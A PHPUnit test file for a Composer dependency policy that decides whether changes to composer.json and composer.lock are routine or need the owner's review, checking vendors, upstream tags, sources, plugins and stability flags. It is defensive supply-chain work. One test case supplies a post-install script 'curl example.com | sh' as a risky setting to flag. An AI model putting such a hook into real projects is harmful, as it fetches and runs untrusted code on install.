<?php

declare(strict_types=1);

namespace Intakt\Tests\Plugin\PhpLanguage\Domain;

use Intakt\Plugin\Language\Contract\DependencyDecision;
use Intakt\Plugin\Language\Contract\DependencyFiles;
use Intakt\Plugin\Language\Contract\DependencyFinding;
use Intakt\Plugin\PhpLanguage\Domain\ComposerFileUnreadable;
use Intakt\Plugin\PhpLanguage\Domain\ComposerPolicy;
use Intakt\Plugin\PhpLanguage\Domain\ComposerState;
use Intakt\Plugin\PhpLanguage\Domain\GitHubCommit;
use Intakt\Plugin\PhpLanguage\Domain\LockedPackage;
use Intakt\Plugin\PhpLanguage\Domain\LockedPackageChanges;
use Intakt\Plugin\PhpLanguage\Domain\RequirementChanges;
use Intakt\Plugin\PhpLanguage\Domain\SettingChanges;
use Intakt\Plugin\PhpLanguage\Domain\TrustedPackages;
use Intakt\Plugin\PhpLanguage\Domain\UpstreamTagNotRead;
use Intakt\Plugin\PhpLanguage\Infrastructure\ComposerPolicyConfiguration;
use Intakt\Tests\Plugin\PhpLanguage\ComposerFiles;
use Intakt\Tests\Plugin\PhpLanguage\LockedCommits;
use Intakt\Tests\Plugin\PhpLanguage\RecordedUpstreamTags;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\UsesClass;
use PHPUnit\Framework\TestCase;

#[CoversClass(ComposerPolicy::class)]
#[CoversClass(ComposerState::class)]
#[CoversClass(LockedPackage::class)]
#[CoversClass(GitHubCommit::class)]
#[CoversClass(SettingChanges::class)]
#[CoversClass(RequirementChanges::class)]
#[CoversClass(LockedPackageChanges::class)]
#[CoversClass(TrustedPackages::class)]
#[CoversClass(ComposerFileUnreadable::class)]
#[UsesClass(UpstreamTagNotRead::class)]
#[UsesClass(DependencyDecision::class)]
#[UsesClass(DependencyFiles::class)]
#[UsesClass(DependencyFinding::class)]
final class ComposerPolicyTest extends TestCase
{
    public function testNoComposerFilesOnEitherSideIsRoutine(): void
    {
        $decision = $this->decide(ComposerFiles::none(), ComposerFiles::none());

        self::assertFalse($decision->needsOwner());
    }

    public function testANewSymfonyPackageFromItsOwnRepositoryAtItsUpstreamTagIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0));

        $decision = $this->decide(ComposerFiles::sample(), $after);

        self::assertSame([], $this->findingsOf($decision));
        self::assertSame(['symfony/uid'], $decision->newPackages);
    }

    public function testANewDoctrinePackageFromAnotherRepositoryOfItsVendorIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('doctrine/doctrine-bundle', '^3.0')
            ->locking([...ComposerFiles::entry('doctrine/doctrine-bundle', '3.0.0', LockedCommits::OTHER, 'doctrine/DoctrineBundle'), 'type' => 'symfony-bundle']);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testANewSymfonyAiPlatformAtABetaTagWithItsBetaFlagIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/ai-anthropic-platform', '^1.0@beta')
            ->locking([...ComposerFiles::entry('symfony/ai-anthropic-platform', 'v1.0.0-BETA1', LockedCommits::OTHER), 'type' => 'symfony-ai-platform'])
            ->withLockKey('stability-flags', ['symfony/ai-anthropic-platform' => 10]);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAnRcFlagForAPackageTheChangeAddsIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0@RC')
            ->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0))
            ->withLockKey('stability-flags', ['symfony/uid' => 5]);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAPackageFromAnotherVendorNeedsTheOwnerAndIsNamed(): void
    {
        $after = ComposerFiles::sample()->requiring('acme/tool', '^1.0')->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        $decision = $this->decide(ComposerFiles::sample(), $after);

        self::assertSame(['acme/tool: is not from a trusted vendor'], $this->findingsOf($decision));
        self::assertSame(['acme/tool'], $decision->newPackages);
    }

    public function testAPackageFromAnotherVendorIsNeverLookedUpUpstream(): void
    {
        $tags = LockedCommits::upstream();
        $after = ComposerFiles::sample()->requiring('acme/tool', '^1.0')->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        $this->decide(ComposerFiles::sample(), $after, $tags);

        self::assertSame([], $tags->asked);
    }

    public function testAVendorThatOnlyStartsLikeATrustedOneIsNotTrusted(): void
    {
        $after = ComposerFiles::sample()->requiring('symfonyx/console', '^1.0')->locking(ComposerFiles::entry('symfonyx/console', '1.0.0', LockedCommits::OTHER));

        self::assertSame(['symfonyx/console: is not from a trusted vendor'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testATransitivePackageFromAnotherVendorNeedsTheOwnerAndIsNamed(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')
            ->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0))
            ->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        $decision = $this->decide(ComposerFiles::sample(), $after);

        self::assertSame(['acme/tool: is not from a trusted vendor'], $this->findingsOf($decision));
        self::assertSame(['acme/tool', 'symfony/uid'], $decision->newPackages);
    }

    public function testANewPlatformRequirementNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('ext-sodium', '*');

        self::assertSame(['ext-sodium: is not from a trusted vendor'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testANewPackageAtACommitThatIsNotTheUpstreamTagNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::FORK));

        self::assertSame(
            ['symfony/uid: commit '.LockedCommits::FORK.' is not the upstream tag v8.0.0'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testANewPackageWhoseTagUpstreamDoesNotExistNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking(ComposerFiles::entry('symfony/uid', 'v8.0.9', LockedCommits::UID_8_0_0));

        self::assertSame(
            ['symfony/uid: commit '.LockedCommits::UID_8_0_0.' is not the upstream tag v8.0.9'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testANewPackageLockedAtABranchNeedsTheOwnerWithoutALookup(): void
    {
        $tags = LockedCommits::upstream();
        $after = ComposerFiles::sample()->requiring('symfony/uid', 'dev-main')->locking(ComposerFiles::entry('symfony/uid', 'dev-main', LockedCommits::UID_8_0_0));

        $decision = $this->decide(ComposerFiles::sample(), $after, $tags);

        self::assertSame(['symfony/uid: is locked at dev-main, which is no release tag'], $this->findingsOf($decision));
        self::assertSame([], $tags->asked);
    }

    public function testAnUpstreamThatCannotBeReadSendsTheChangeToTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0));

        self::assertSame(
            ['symfony/uid: the upstream tag could not be read: git failed 3 times: could not resolve host'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after, new RecordedUpstreamTags(unreachable: true))),
        );
    }

    public function testANewPackageFromAnotherOrganizationsRepositoryNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0, 'someone/uid'));

        self::assertSame(
            ['symfony/uid: does not come from its own vendor\'s repository at one commit'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    /**
     * @return iterable<string, array{array<string, mixed>}>
     */
    public static function placesThatDisagree(): iterable
    {
        $entry = ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0);

        yield 'an archive from another host' => [[...$entry, 'dist' => ['type' => 'zip', 'url' => 'https://example.com/uid.zip', 'reference' => LockedCommits::UID_8_0_0]]];
        yield 'an archive of another commit' => [[...$entry, 'dist' => ['type' => 'zip', 'url' => 'https://api.github.com/repos/symfony/uid/zipball/'.LockedCommits::FORK, 'reference' => LockedCommits::FORK]]];
        yield 'a source in another form' => [[...$entry, 'source' => ['type' => 'hg', 'url' => 'https://github.com/symfony/uid.git', 'reference' => LockedCommits::UID_8_0_0]]];
        yield 'neither a source nor an archive' => [array_diff_key($entry, ['source' => true, 'dist' => true])];
        yield 'a source and no archive from another organization' => [[...array_diff_key($entry, ['dist' => true]), 'source' => ['type' => 'git', 'url' => 'https://github.com/someone/uid.git', 'reference' => LockedCommits::UID_8_0_0]]];
    }

    /**
     * @param array<string, mixed> $entry
     */
    #[DataProvider('placesThatDisagree')]
    public function testANewPackageWhoseSourceAndArchiveDoNotNameOneGitHubCommitNeedsTheOwner(array $entry): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking($entry);

        self::assertSame(
            ['symfony/uid: does not come from its own vendor\'s repository at one commit'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testANewPackageWithOnlyAnArchiveOfItsOwnRepositoryIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')
            ->locking(array_diff_key(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0), ['source' => true]));

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    /**
     * @return iterable<string, array{array<string, mixed>, string}>
     */
    public static function effects(): iterable
    {
        yield 'binaries' => [['bin' => ['bin/uid']], 'ships binaries'];
        yield 'a single binary' => [['bin' => 'bin/uid'], 'ships binaries'];
        yield 'autoload files' => [['autoload' => ['files' => ['bootstrap.php']]], 'has autoload files'];
        yield 'a Composer plugin' => [['type' => 'composer-plugin'], 'is a Composer plugin'];
        yield 'a type not allowed' => [['type' => 'symfony-pack'], 'has the package type "symfony-pack", which is not allowed'];
    }

    /**
     * @param array<string, mixed> $effect
     */
    #[DataProvider('effects')]
    public function testANewTrustedPackageThatRunsCodeOnInstallOrLoadNeedsTheOwner(array $effect, string $reason): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking([...ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0), ...$effect]);

        self::assertSame(['symfony/uid: '.$reason], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAComposerPluginNeedsTheOwnerEvenWhenTheOwnerAllowsItsType(): void
    {
        $policy = new ComposerPolicy(new TrustedPackages(['symfony'], ['library', 'composer-plugin']), LockedCommits::upstream());
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking([...ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0), 'type' => 'composer-plugin']);

        $decision = $policy->decide(ComposerFiles::sample()->files(), $after->files());

        self::assertSame(['symfony/uid: is a Composer plugin'], $this->findingsOf($decision));
    }

    public function testTheOwnersVendorsReplaceTheDefaults(): void
    {
        $policy = new ComposerPolicy(new TrustedPackages(['acme'], ['library']), LockedCommits::upstream());
        $after = ComposerFiles::sample()->requiring('acme/tool', '^1.0')->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        self::assertSame([], $this->findingsOf($policy->decide(ComposerFiles::sample()->files(), $after->files())));
    }

    public function testAConstraintUpdateAtTheUpstreamTagIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/console', '^8.1')->locking(ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::CONSOLE_8_1_0))->withLockKey('content-hash', 'bbb');

        $decision = $this->decide(ComposerFiles::sample(), $after);

        self::assertSame([], $this->findingsOf($decision));
        self::assertSame([], $decision->newPackages);
    }

    public function testAnUpdateToACommitThatIsNotTheUpstreamTagNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->locking(ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::FORK));

        self::assertSame(
            ['symfony/console: commit '.LockedCommits::FORK.' is not the upstream tag v8.1.0'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testAnUpdateOfAnotherVendorsPackageAtItsUpstreamTagIsRoutine(): void
    {
        $before = ComposerFiles::sample()->requiring('acme/tool', '^0.9')->locking(ComposerFiles::entry('acme/tool', '0.9.0', LockedCommits::FORK));
        $after = $before->requiring('acme/tool', '^1.0')->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        self::assertSame([], $this->findingsOf($this->decide($before, $after)));
    }

    public function testAnUpdateFromAnotherRepositoryNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->locking(ComposerFiles::entry('symfony/console', 'v8.0.0', LockedCommits::CONSOLE_8_0_0, 'someone/console'));

        self::assertSame(['symfony/console: its repository changed or cannot be checked'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAnUpdateThatStartsShippingBinariesNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->locking([...ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::CONSOLE_8_1_0), 'bin' => ['bin/console']]);

        self::assertSame(['symfony/console: its type, binaries or autoload files changed'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testATrustedPackageMovedUnchangedToTheDevelopmentRequirementsIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiringForDevelopment('symfony/console', '^8.0')->lockingForDevelopment(ComposerFiles::entry('symfony/console', 'v8.0.0', LockedCommits::CONSOLE_8_0_0));

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testATrustedPackageMovedWithAnotherConstraintNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiringForDevelopment('symfony/console', '^8.1')->lockingForDevelopment(ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::CONSOLE_8_1_0));

        self::assertSame(['symfony/console: moved from require to require-dev'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAPackageFromAnotherVendorMovedUnchangedNeedsTheOwner(): void
    {
        $before = ComposerFiles::sample()->requiringForDevelopment('acme/tool', '^1.0')->lockingForDevelopment(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));
        $after = $before->requiring('acme/tool', '^1.0')->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        self::assertSame(
            ['acme/tool: moved from require-dev to require', 'acme/tool: moved between the main and the development packages'],
            $this->findingsOf($this->decide($before, $after)),
        );
    }

    public function testARemovedPackageNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->withoutRequirement('symfony/console')->withLockKey('packages', []);

        self::assertSame(
            ['symfony/console: was removed from composer.json', 'symfony/console: was removed from composer.lock'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testADevelopmentFlagForAPackageTheChangeAddsNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0@dev')
            ->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0))
            ->withLockKey('stability-flags', ['symfony/uid' => 20]);

        self::assertSame(
            ['symfony/uid: has the stability flag @dev', 'symfony/uid: its stability flag in composer.lock changed'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testABetaFlagForAPackageAlreadyRequiredNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/console', '^8.0@beta')->withLockKey('stability-flags', ['symfony/console' => 10]);

        self::assertSame(
            ['symfony/console: has the stability flag @beta', 'symfony/console: its stability flag in composer.lock changed'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testAFlagThePackageAlreadyHadStaysRoutine(): void
    {
        $before = ComposerFiles::sample()->requiring('symfony/console', '^8.0@beta')->withLockKey('stability-flags', ['symfony/console' => 10]);
        $after = $before->requiring('symfony/console', '^8.0.1@beta');

        self::assertSame([], $this->findingsOf($this->decide($before, $after)));
    }

    /**
     * @return iterable<string, array{string, mixed}>
     */
    public static function manifestSettings(): iterable
    {
        yield 'scripts' => ['scripts', ['post-install-cmd' => ['curl example.com | sh']]];
        yield 'plugins allowed' => ['config', ['sort-packages' => true, 'allow-plugins' => ['acme/plugin' => true]]];
        yield 'repositories' => ['repositories', [['type' => 'vcs', 'url' => 'https://example.com/fork.git']]];
        yield 'minimum stability' => ['minimum-stability', 'dev'];
        yield 'autoload files' => ['autoload', ['files' => ['boot.php']]];
    }

    #[DataProvider('manifestSettings')]
    public function testAChangeToComposersOwnSettingsNeedsTheOwner(string $key, mixed $value): void
    {
        $after = ComposerFiles::sample()->withManifestKey($key, $value);

        self::assertSame(['composer.json '.$key.': one of Composer\'s own settings changed'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    /**
     * @return iterable<string, array{string, mixed}>
     */
    public static function lockSettings(): iterable
    {
        yield 'minimum stability' => ['minimum-stability', 'dev'];
        yield 'prefer stable' => ['prefer-stable', false];
        yield 'platform overrides' => ['platform-overrides', ['php' => '8.5.0']];
        yield 'aliases' => ['aliases', [['package' => 'symfony/console', 'version' => '9.0.0.0', 'alias' => '9.0', 'alias_normalized' => '9.0.0.0']]];
    }

    #[DataProvider('lockSettings')]
    public function testAChangeToTheLockFilesSettingsNeedsTheOwner(string $key, mixed $value): void
    {
        $after = ComposerFiles::sample()->withLockKey($key, $value);

        self::assertSame(['composer.lock '.$key.': one of Composer\'s own settings changed'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testWhatComposerRewritesOnEveryUpdateIsRoutine(): void
    {
        $after = ComposerFiles::sample()->withLockKey('content-hash', 'ccc')->withLockKey('plugin-api-version', '2.11.0')->withLockKey('_readme', ['other']);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function unreadableLocks(): iterable
    {
        yield 'no JSON' => ['{"packages": [', 'composer.lock cannot be read: Syntax error'];
        yield 'no object' => ['"packages"', 'composer.lock cannot be read: it holds no JSON object'];
        yield 'a list' => ['[1]', 'composer.lock cannot be read: it holds no JSON object'];
        yield 'packages that are no list' => ['{"packages": {"a": {}}}', 'composer.lock cannot be read: packages is no list'];
        yield 'a package without a name' => ['{"packages": [{"version": "1.0.0"}]}', 'composer.lock cannot be read: a locked package has no name or version'];
        yield 'a package locked twice' => ['{"packages": [{"name": "symfony/uid", "version": "v8.0.0"}, {"name": "Symfony/Uid", "version": "v8.0.1"}]}', 'composer.lock cannot be read: packages locks a package twice'];
        yield 'a package in both groups' => ['{"packages": [{"name": "symfony/uid", "version": "v8.0.0"}], "packages-dev": [{"name": "symfony/uid", "version": "v8.0.0"}]}', 'composer.lock cannot be read: a package is in both the main and the development group'];
        yield 'stability flags that are no map' => ['{"stability-flags": [10]}', 'composer.lock cannot be read: stability-flags is no map of package names'];
    }

    #[DataProvider('unreadableLocks')]
    public function testAnUnreadableLockFileNeedsTheOwner(string $lock, string $reason): void
    {
        $after = new DependencyFiles([...ComposerFiles::sample()->files()->contents, 'composer.lock' => $lock]);

        $decision = new ComposerPolicy($this->trusted(), LockedCommits::upstream())->decide(ComposerFiles::sample()->files(), $after);

        self::assertSame(['composer.lock: '.$reason], $this->findingsOf($decision));
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function unreadableManifests(): iterable
    {
        yield 'a constraint that is no string' => ['{"require": {"symfony/uid": 8}}', 'composer.json cannot be read: the constraint of symfony/uid in require is no string'];
        yield 'a requirement named twice' => ['{"require": {"symfony/uid": "^8.0", "Symfony/Uid": "^7.0"}}', 'composer.json cannot be read: require names a package twice'];
        yield 'a requirement in both sections' => ['{"require": {"symfony/uid": "^8.0"}, "require-dev": {"symfony/uid": "^8.0"}}', 'composer.json cannot be read: a package is in both the main and the development group'];
    }

    #[DataProvider('unreadableManifests')]
    public function testAnUnreadableManifestNeedsTheOwner(string $manifest, string $reason): void
    {
        $after = new DependencyFiles(['composer.json' => $manifest]);

        $decision = new ComposerPolicy($this->trusted(), LockedCommits::upstream())->decide(ComposerFiles::none()->files(), $after);

        self::assertSame(['composer.json: '.$reason], $this->findingsOf($decision));
    }

    public function testAnUnreadableLockFileAtTheBaseNeedsTheOwnerToo(): void
    {
        $before = new DependencyFiles(['composer.lock' => 'not json']);

        $decision = new ComposerPolicy($this->trusted(), LockedCommits::upstream())->decide($before, ComposerFiles::sample()->files());

        self::assertTrue($decision->needsOwner());
        self::assertSame('composer.lock', $decision->findings[0]->subject);
    }

    public function testAChangeBeyondRoutineNamesEveryNewPackage(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->requiring('acme/tool', '^1.0')
            ->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0))
            ->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER))
            ->withManifestKey('scripts', ['post-install-cmd' => 'acme-setup']);

        $decision = $this->decide(ComposerFiles::sample(), $after);

        self::assertTrue($decision->needsOwner());
        self::assertSame(['acme/tool', 'symfony/uid'], $decision->newPackages);
    }

    private function decide(ComposerFiles $before, ComposerFiles $after, ?RecordedUpstreamTags $tags = null): DependencyDecision
    {
        return new ComposerPolicy($this->trusted(), $tags ?? LockedCommits::upstream())->decide($before->files(), $after->files());
    }

    private function trusted(): TrustedPackages
    {
        return new TrustedPackages(ComposerPolicyConfiguration::DEFAULT_VENDORS, ComposerPolicyConfiguration::DEFAULT_TYPES);
    }

    /**
     * @return list<string>
     */
    private function findingsOf(DependencyDecision $decision): array
    {
        return array_map(static fn (DependencyFinding $finding): string => $finding->subject.': '.$finding->reason, $decision->findings);
    }
}
